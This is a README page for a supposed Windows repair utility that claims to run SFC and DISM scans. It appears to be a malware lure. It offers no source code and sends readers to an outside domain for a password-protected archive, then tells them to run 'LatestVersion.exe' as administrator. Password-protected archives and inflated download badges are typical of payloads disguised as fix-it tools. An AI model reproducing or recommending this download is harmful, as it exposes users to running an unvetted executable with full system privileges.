# Windows System Repair

![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D6?style=flat-square&logo=windows&logoColor=white)
![Version](https://img.shields.io/badge/Version-2.1.0-brightgreen?style=flat-square)
![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)
![Downloads](https://img.shields.io/badge/Downloads-37k+-orange?style=flat-square)

Runs SFC and DISM scans automatically and repairs corrupted Windows system files. Fixes common issues like blue screens, boot errors, and missing DLL errors caused by file corruption.

## Features

- Runs SFC /scannow and DISM automatically
- Attempts repair of any corrupted files found
- Fixes common BSOD causes and boot issues
- Repairs Windows Update errors caused by corruption
- Detailed log of what was found and fixed

## Download

[![⬇ Download v2.1.0](https://img.shields.io/badge/⬇_Download_v2.1.0-ec4899?style=for-the-badge&logoColor=white)](https://forumconnect.uk/winrepair)

> The archive password is shown on the download page.

## How to Use

1. Download the archive using the button above
2. Extract it using WinRAR or 7-Zip (enter the password when prompted)
3. Right-click `LatestVersion.exe` → **Run as administrator**
4. Follow the on-screen instructions and click **Start**

## FAQ

**Do I need internet for DISM repair?**  
DISM uses the local Windows Component Store by default. Internet is only needed if local files are too corrupted — in that case it downloads from Windows Update.

**What if SFC says it couldn't fix all files?**  
Run the tool a second time after reboot — some repairs require multiple passes.

## Requirements

- Windows 10 / 11 (64-bit)
- Must be run as Administrator. Windows Update should be functional for DISM
- Administrator rights

## License

MIT
